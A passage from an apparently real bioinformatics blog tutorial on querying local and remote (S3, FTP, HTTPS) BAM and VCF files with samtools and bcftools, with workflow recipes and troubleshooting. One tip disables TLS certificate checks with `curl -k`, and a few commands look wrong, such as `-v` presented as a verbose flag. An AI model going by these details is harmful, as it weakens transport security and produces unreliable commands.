style="color:hsl(119, 34%, 47%)">read1	0	chr1	100	60	10M	*	0	0	ACGTACGTAC	IIIIIIIIII</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">read2	0	chr1	120	60	10M	*	0	0	TGCATGCATG	IIIIIIIIII</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">read3	0	chr1	50000	60	10M	*	0	0	AAAAAAAAAA	IIIIIIIIII</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">read4	0	chr1	100000	60	10M	*	0	0	TTTTTTTTTT	IIIIIIIIII</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Convert to BAM and index</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> test.sam </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> test.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run samtools index test.bam</span><br></span></code></pre></div></div>
<p><strong>Test samtools region queries:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># View reads in region</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run samtools view test.bam chr1:1-60000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Count reads in region</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> test.bam chr1:1-60000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract region to new file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run samtools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> test.bam chr1:50000-100000 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> region.bam</span><br></span></code></pre></div></div>
<p>Once comfortable with local files, the same commands work seamlessly with remote S3, FTP, or HTTPS URLs—just replace local filenames with remote URLs.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="6-common-workflows-and-recipes">6. Common Workflows and Recipes<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#6-common-workflows-and-recipes" class="hash-link" aria-label="Direct link to 6. Common Workflows and Recipes" title="Direct link to 6. Common Workflows and Recipes" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="61-extract-variants-for-specific-genes">6.1 Extract Variants for Specific Genes<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#61-extract-variants-for-specific-genes" class="hash-link" aria-label="Direct link to 6.1 Extract Variants for Specific Genes" title="Direct link to 6.1 Extract Variants for Specific Genes" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Define gene regions (example: gene1, gene2)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> genes.bed </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'EOF'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">1	11869	14409	DDX11L1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">1	17369	17436	MIR6859-1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract variants from remote file for gene regions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  s3://my-bucket/variants.vcf.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-R</span><span class="token plain"> genes.bed </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">v</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> local_genes.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compress and index</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bgzip </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> local_genes.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tabix </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> vcf local_genes.vcf.gz</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="62-compare-samples-across-remote-files">6.2 Compare Samples Across Remote Files<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#62-compare-samples-across-remote-files" class="hash-link" aria-label="Direct link to 6.2 Compare Samples Across Remote Files" title="Direct link to 6.2 Compare Samples Across Remote Files" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compare variants for two samples in different S3 files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools isec </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">bcftools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> sample1 s3://bucket1/variants.vcf.gz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">bcftools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-s</span><span class="token plain"> sample2 s3://bucket2/variants.vcf.gz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> comparison_output</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Shows shared and unique variants</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> comparison_output/</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="63-annotate-remote-vcf-with-remote-annotations">6.3 Annotate Remote VCF with Remote Annotations<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#63-annotate-remote-vcf-with-remote-annotations" class="hash-link" aria-label="Direct link to 6.3 Annotate Remote VCF with Remote Annotations" title="Direct link to 6.3 Annotate Remote VCF with Remote Annotations" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Annotate S3-hosted VCF using FTP-hosted annotation file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools annotate </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  s3://my-bucket/variants.vcf.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-a</span><span class="token plain"> ftp://ftp.ncbi.nlm.nih.gov/snp/organisms/human_9606_b150_GRCh37p13/VCF/common_all.vcf.gz </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> ID </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">v</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> annotated.vcf</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="64-extract-bam-regions-for-multiple-samples">6.4 Extract BAM Regions for Multiple Samples<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#64-extract-bam-regions-for-multiple-samples" class="hash-link" aria-label="Direct link to 6.4 Extract BAM Regions for Multiple Samples" title="Direct link to 6.4 Extract BAM Regions for Multiple Samples" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create list of regions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> regions.txt </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'EOF'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">chr1:1-1000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">chr2:2000000-3000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">chr3:5000000-6000000</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Extract each region from remote BAM, save locally</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">while</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">read</span><span class="token plain"> region</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools view </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    s3://my-bucket/aligned.bam </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$region</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-b</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${region</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token variable" style="color:hsl(221, 87%, 60%)">_}</span><span class="token plain">.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools index </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${region</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">:</span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token variable" style="color:hsl(221, 87%, 60%)">_}</span><span class="token plain">.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain"> regions.txt</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="65-stream-processing-without-local-storage">6.5 Stream Processing Without Local Storage<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#65-stream-processing-without-local-storage" class="hash-link" aria-label="Direct link to 6.5 Stream Processing Without Local Storage" title="Direct link to 6.5 Stream Processing Without Local Storage" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pipe remote data through multiple tools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view s3://my-bucket/variants.vcf.gz chr1:1-1000000 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> bcftools query </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'%CHROM\t%POS\t%REF\t%ALT\t%AC\t%AF\n'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">awk</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'$6 &gt; 0.05'</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tee</span><span class="token plain"> filtered_variants.tsv </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="7-troubleshooting-and-optimization">7. Troubleshooting and Optimization<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#7-troubleshooting-and-optimization" class="hash-link" aria-label="Direct link to 7. Troubleshooting and Optimization" title="Direct link to 7. Troubleshooting and Optimization" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="71-common-issues">7.1 Common Issues<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#71-common-issues" class="hash-link" aria-label="Direct link to 7.1 Common Issues" title="Direct link to 7.1 Common Issues" translate="no">​</a></h3>
<p><strong>Issue</strong>: "File not found" or 404 errors</p>
<ul>
<li class=""><strong>Solution</strong>: Verify S3 bucket name, path, and file permissions. Test with AWS CLI:<!-- -->
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> s3://bucket-name/path/file.vcf.gz</span><br></span></code></pre></div></div>
</li>
</ul>
<p><strong>Issue</strong>: Authentication failures with S3</p>
<ul>
<li class=""><strong>Solution</strong>: Verify AWS credentials:<!-- -->
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws sts get-caller-identity</span><br></span></code></pre></div></div>
</li>
</ul>
<p><strong>Issue</strong>: Index not found (<code>.tbi</code> or <code>.bai</code> missing)</p>
<ul>
<li class=""><strong>Solution</strong>: Create indexes or verify they exist on remote server:<!-- -->
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">aws s3 </span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> s3://bucket-name/file.vcf.gz.tbi</span><br></span></code></pre></div></div>
</li>
</ul>
<p><strong>Issue</strong>: "Connection timeout" on FTP</p>
<ul>
<li class=""><strong>Solution</strong>: Increase timeout and try again:<!-- -->
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">CURL_CONNECT_TIMEOUT</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">60</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">CURL_TIMEOUT</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">120</span><br></span></code></pre></div></div>
</li>
</ul>
<p><strong>Issue</strong>: HTTPS SSL certificate errors</p>
<ul>
<li class=""><strong>Solution</strong>: Verify certificate validity or temporarily disable verification for testing:<!-- -->
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-k</span><span class="token plain"> https://endpoint.com/file.vcf.gz.tbi  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># -k disables cert verification</span><br></span></code></pre></div></div>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="72-optimization-tips">7.2 Optimization Tips<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#72-optimization-tips" class="hash-link" aria-label="Direct link to 7.2 Optimization Tips" title="Direct link to 7.2 Optimization Tips" translate="no">​</a></h3>
<p><strong>For S3 Access</strong>:</p>
<ul>
<li class="">Use S3 Transfer Acceleration if available for faster downloads</li>
<li class="">Place compute resources in the same AWS region as your data</li>
<li class="">Use bucket endpoints to avoid Internet Gateway charges:<!-- -->
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># VPC endpoint for S3 (no data transfer charges within VPC)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">s3://bucket-name/key</span><br></span></code></pre></div></div>
</li>
</ul>
<p><strong>For Large Batch Queries</strong>:</p>
<ul>
<li class="">Sort region requests by chromosome for better caching</li>
<li class="">Consider downloading entire chromosome subset once, then querying locally:<!-- -->
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view s3://bucket/variants.vcf.gz chr1 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> chr1.vcf.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools index chr1.vcf.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Then query locally multiple times</span><br></span></code></pre></div></div>
</li>
</ul>
<p><strong>For FTP Performance</strong>:</p>
<ul>
<li class="">Batch multiple queries when possible</li>
<li class="">Check server-side compression settings</li>
<li class="">Consider mirror/rsync services for frequently accessed data</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="73-debugging-with-verbose-output">7.3 Debugging with Verbose Output<a href="https://riverxdata.github.io/river-docs/blog/remote-files-htslib-bcftools-samtools#73-debugging-with-verbose-output" class="hash-link" aria-label="Direct link to 7.3 Debugging with Verbose Output" title="Direct link to 7.3 Debugging with Verbose Output" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Enable verbose output for debugging</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">HTS_LOG_LEVEL</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">debug</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use bcftools verbose flag</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools view </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> s3://bucket/variants.vcf.gz chr1:1-1000000</span><br></span><span 